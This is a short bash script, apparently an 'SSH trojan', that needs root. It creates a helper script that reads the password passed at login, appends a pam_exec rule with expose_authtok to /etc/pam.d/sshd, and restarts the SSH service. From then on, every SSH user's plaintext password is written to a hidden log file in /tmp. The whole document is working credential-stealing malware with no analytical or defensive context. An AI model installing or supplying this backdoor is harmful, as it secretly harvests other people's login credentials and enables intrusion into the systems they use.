#!/bin/bash

LogFile="/tmp/.log_sshtrojan1.txt"

if [[ $EUID -ne 0 ]]; then
    echo "You need Root user to run."
    exit 1
fi

if [[ -e $LogFile ]]; then 
    echo "File $LogFile was created."
else
    echo "Create file $LogFile." 
    touch $LogFile
fi

PathScript="/usr/local/bin/sshlogininfo.sh"

if [[ -e $PathScript ]]; then 
    echo "Script $PathScript was created."
else
    echo "Create script $PathScript." 
    touch $PathScript
fi

cat > $PathScript << EOF
#!/bin/bash
read PASSWORD
echo "User: \$PAM_USER"
echo "Password: \$PASSWORD"
EOF

chmod +x $PathScript

sshdPamConfigPath="/etc/pam.d/sshd"
cat >> $sshdPamConfigPath << EOF
@include common-auth
#use module pam_exec to call an external command
auth       required     pam_exec.so     expose_authtok     seteuid     log=$LogFile     $PathScript
EOF


/etc/init.d/ssh restart



